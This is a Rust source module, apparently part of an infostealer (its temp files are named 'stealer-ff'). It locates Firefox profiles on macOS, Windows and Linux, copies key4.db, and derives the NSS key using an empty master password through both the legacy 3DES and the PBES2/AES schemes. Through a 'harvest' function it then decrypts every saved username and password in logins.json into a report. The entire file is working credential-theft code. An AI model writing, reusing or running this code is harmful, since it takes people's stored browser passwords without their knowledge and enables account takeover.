//! Firefox `logins.json` recovery through the NSS `key4.db` store.
//!
//! Two NSS PBE schemes are implemented: the legacy Mozilla HMAC-SHA1/3DES
//! construction and PKCS#5 PBES2 with PBKDF2-HMAC-SHA256 and AES-256-CBC. An
//! empty master password is tried; a real master password is reported as locked.

use std::{
    fs,
    path::{Path, PathBuf},
    sync::atomic::{AtomicU32, Ordering},
};

use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
use base64::Engine;
use des::TdesEde3;
use hmac::{Hmac, Mac};
use pbkdf2::pbkdf2_hmac;
use rusqlite::{Connection, OpenFlags};
use serde::Serialize;
use sha1::{Digest, Sha1};
use sha2::Sha256;

use crate::home;

type TripleDes = cbc::Decryptor<TdesEde3>;
type Aes256 = cbc::Decryptor<aes::Aes256>;
type HmacSha1 = Hmac<Sha1>;

static NEXT: AtomicU32 = AtomicU32::new(0);

const OID_PBE_3DES: &[u8] = &[
    0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x0c, 0x05, 0x01, 0x03,
];
const OID_PBES2: &[u8] = &[0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x05, 0x0d];
const OID_AES256: &[u8] = &[0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2a];

/// One recovered login.
#[derive(Debug, Clone, Serialize)]
pub struct Login {
    /// Profile path.
    pub profile: String,
    /// Login host.
    pub host: String,
    /// Decrypted username.
    pub username: String,
    /// Decrypted password.
    pub password: String,
}

/// Firefox recovery result.
#[derive(Debug, Default, Serialize)]
pub struct Report {
    /// Recovered logins.
    pub logins: Vec<Login>,
    /// Non-fatal problems.
    pub warnings: Vec<String>,
}

/// Candidate Firefox profile directories for this OS.
pub fn profiles() -> Vec<PathBuf> {
    let Some(home) = home() else {
        return Vec::new();
    };
    let roots = if cfg!(target_os = "macos") {
        vec![home.join("Library/Application Support/Firefox/Profiles")]
    } else if cfg!(windows) {
        std::env::var_os("APPDATA")
            .map(|value| vec![PathBuf::from(value).join("Mozilla/Firefox/Profiles")])
            .unwrap_or_default()
    } else {
        vec![
            home.join(".mozilla/firefox"),
            home.join("snap/firefox/common/.mozilla/firefox"),
        ]
    };
    let mut found = Vec::new();
    for root in roots {
        let Ok(entries) = fs::read_dir(&root) else {
            continue;
        };
        for entry in entries.filter_map(Result::ok) {
            let path = entry.path();
            if path.is_dir() && path.join("logins.json").is_file() {
                found.push(path);
            }
        }
    }
    found
}

/// Recovers logins from every profile.
pub fn harvest(limit: usize) -> Report {
    let mut report = Report::default();
    for profile in profiles() {
        if report.logins.len() >= limit {
            break;
        }
        recover(&profile, &mut report, limit);
    }
    report
}

fn recover(profile: &Path, report: &mut Report, limit: usize) {
    let key4 = profile.join("key4.db");
    let logins = profile.join("logins.json");
    if !key4.is_file() || !logins.is_file() {
        return;
    }
    let index = NEXT.fetch_add(1, Ordering::Relaxed);
    let copy = std::env::temp_dir().join(format!("stealer-ff-{}-{index}.db", std::process::id()));
    if fs::copy(&key4, &copy).is_err() {
        report
            .warnings
            .push(format!("{}: cannot copy key4.db", profile.display()));
        return;
    }
    let key = database_key(&copy, report, profile);
    let _ = fs::remove_file(&copy);
    let Some((key, aes)) = key else {
        return;
    };
    let Ok(text) = fs::read_to_string(&logins) else {
        return;
    };
    let Ok(document) = serde_json::from_str::<serde_json::Value>(&text) else {
        return;
    };
    let Some(entries) = document.get("logins").and_then(|value| value.as_array()) else {
        return;
    };
    for entry in entries {
        if report.logins.len() >= limit {
            break;
        }
        let host = entry
            .get("hostname")
            .and_then(|value| value.as_str())
            .unwrap_or_default();
        let decode = |field: &str| -> Option<Vec<u8>> {
            let raw = entry.get(field)?.as_str()?;
            let blob = base64::engine::general_purpose::STANDARD.decode(raw).ok()?;
            decrypt_login(&key, aes, &blob)
        };
        let (Some(username), Some(password)) =
            (decode("encryptedUsername"), decode("encryptedPassword"))
        else {
            report.warnings.push(format!(
                "{}: {host}: encrypted login did not decrypt",
                profile.display()
            ));
            continue;
        };
        report.logins.push(Login {
            profile: profile.display().to_string(),
            host: host.to_owned(),
            username: String::from_utf8_lossy(&username).into_owned(),
            password: String::from_utf8_lossy(&password).into_owned(),
        });
    }
}

/// Returns the login key and whether it is an AES key.
fn database_key(path: &Path, report: &mut Report, profile: &Path) -> Option<(Vec<u8>, bool)> {
    let connection = Connection::open_with_flags(
        path,
        OpenFlags::SQLITE_OPEN_READ_ONLY | OpenFlags::SQLITE_OPEN_NO_MUTEX,
    )
    .ok()?;
    let (global_salt, check): (Vec<u8>, Vec<u8>) = connection
        .query_row(
            "SELECT item1, item2 FROM metadata WHERE id='password'",
            [],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )
        .ok()?;
    let (algorithm, plain) = decrypt_pbe(&global_salt, b"", &check)?;
    if !plain.starts_with(b"password-check") {
        report.warnings.push(format!(
            "{}: master password set (only empty is tried)",
            profile.display()
        ));
        return None;
    }
    let (entry, _): (Vec<u8>, Vec<u8>) = connection
        .query_row(
            "SELECT a11, a102 FROM nssPrivate WHERE a11 IS NOT NULL LIMIT 1",
            [],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )
        .ok()?;
    let (_, material) = decrypt_pbe(&global_salt, b"", &entry)?;
    let material = trim_zeroes(material);
    let aes = algorithm == Algorithm::Aes;
    let size = if aes { 32 } else { 24 };
    (material.len() >= size).then(|| (material[..size].to_vec(), aes))
}

#[derive(PartialEq, Eq, Clone, Copy)]
enum Algorithm {
    TripleDes,
    Aes,
}

/// Decrypts one NSS PBE item and returns `(algorithm, plaintext)`.
fn decrypt_pbe(global_salt: &[u8], password: &[u8], blob: &[u8]) -> Option<(Algorithm, Vec<u8>)> {
    let nodes = parse(blob)?;
    let outer = nodes.first()?;
    let [algorithm, ciphertext] = outer.children.as_slice() else {
        return None;
    };
    let oid = algorithm.children.first()?.value.as_slice();
    let params = algorithm.children.get(1)?;
    let ciphertext = &ciphertext.value;
    if oid == OID_PBE_3DES {
        let [salt, _iterations] = params.children.as_slice() else {
            return None;
        };
        let (key, iv) = legacy_key(global_salt, password, &salt.value);
        let buffer = ciphertext.clone();
        let plain = TripleDes::new_from_slices(&key, &iv)
            .ok()?
            .decrypt_padded_vec_mut::<Pkcs7>(&buffer)
            .ok()?;
        Some((Algorithm::TripleDes, plain))
    } else if oid == OID_PBES2 {
        let kdf = params.children.first()?;
        let scheme = kdf.children.get(1)?;
        let [salt, iterations, key_length, _hash] = scheme.children.as_slice() else {
            return None;
        };
        let iterations = be_u32(&iterations.value);
        let key_length = be_u32(&key_length.value) as usize;
        let cipher = params.children.get(1)?;
        let iv_bytes = cipher.children.first()?.value.as_slice();
        let mut iv = vec![0x04, iv_bytes.len() as u8];
        iv.extend_from_slice(iv_bytes);
        let base = Sha1::digest([global_salt, password].concat());
        let mut key = vec![0_u8; key_length];
        pbkdf2_hmac::<Sha256>(&base, &salt.value, iterations, &mut key);
        if iv.len() != 16 || key.len() != 32 {
            return None;
        }
        let buffer = ciphertext.clone();
        let plain = Aes256::new_from_slices(&key, &iv)
            .ok()?
            .decrypt_padded_vec_mut::<Pkcs7>(&buffer)
            .ok()?;
        Some((Algorithm::Aes, plain))
    } else {
        let _ = OID_AES256;
        None
    }
}

/// Mozilla's key3/key4 derivation: HMAC-SHA1 chain over the entry salt.
fn legacy_key(global_salt: &[u8], password: &[u8], entry_salt: &[u8]) -> (Vec<u8>, Vec<u8>) {
    let hp = Sha1::digest([global_salt, password].concat());
    let chp = Sha1::digest([hp.as_slice(), entry_salt].concat());
    let mut padded = entry_salt.to_vec();
    padded.resize(20, 0);
    let k1 = hmac(&chp, &[padded.as_slice(), entry_salt].concat());
    let tk = hmac(&chp, &padded);
    let k2 = hmac(&chp, &[tk.as_slice(), entry_salt].concat());
    let key = [k1, k2].concat();
    (key[..24].to_vec(), key[32..40].to_vec())
}

fn hmac(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut mac = HmacSha1::new_from_slice(key).expect("HMAC accepts any key");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

/// Decrypts a `logins.json` username/password blob.
fn decrypt_login(key: &[u8], aes: bool, blob: &[u8]) -> Option<Vec<u8>> {
    let nodes = parse(blob)?;
    let outer = nodes.first()?;
    let algorithm = outer.children.get(1)?;
    let iv = algorithm.children.get(1)?.value.clone();
    let ciphertext = outer.children.get(2)?.value.clone();
    let buffer = ciphertext;
    Some(if aes {
        Aes256::new_from_slices(&key[..32], &iv)
            .ok()?
            .decrypt_padded_vec_mut::<Pkcs7>(&buffer)
            .ok()?
    } else {
        TripleDes::new_from_slices(&key[..24], &iv)
            .ok()?
            .decrypt_padded_vec_mut::<Pkcs7>(&buffer)
            .ok()?
    })
}

fn trim_zeroes(mut value: Vec<u8>) -> Vec<u8> {
    while value.last().is_some_and(|byte| *byte == 0) {
        value.pop();
    }
    value
}

fn be_u32(bytes: &[u8]) -> u32 {
    bytes
        .iter()
        .fold(0_u32, |value, byte| (value << 8) | *byte as u32)
        .max(1)
}

#[derive(Debug)]
struct Node {
    value: Vec<u8>,
    children: Vec<Node>,
}

fn parse(data: &[u8]) -> Option<Vec<Node>> {
    let mut pos = 0;
    let mut nodes = Vec::new();
    while pos < data.len() {
        let (node, next) = node(data, pos)?;
        nodes.push(node);
        pos = next;
    }
    Some(nodes)
}

fn node(data: &[u8], pos: usize) -> Option<(Node, usize)> {
    let tag = *data.get(pos)?;
    let first = *data.get(pos + 1)? as usize;
    let (start, length) = if first & 0x80 == 0 {
        (pos + 2, first)
    } else {
        let count = first & 0x7f;
        if count == 0 || count > 4 {
            return None;
        }
        let mut length = 0_usize;
        for offset in 0..count {
            length = (length << 8) | *data.get(pos + 2 + offset)? as usize;
        }
        (pos + 2 + count, length)
    };
    let end = start.checked_add(length)?;
    let value = data.get(start..end)?.to_vec();
    let children = if tag & 0x20 != 0 {
        parse(&value)?
    } else {
        Vec::new()
    };
    Some((Node { value, children }, end))
}
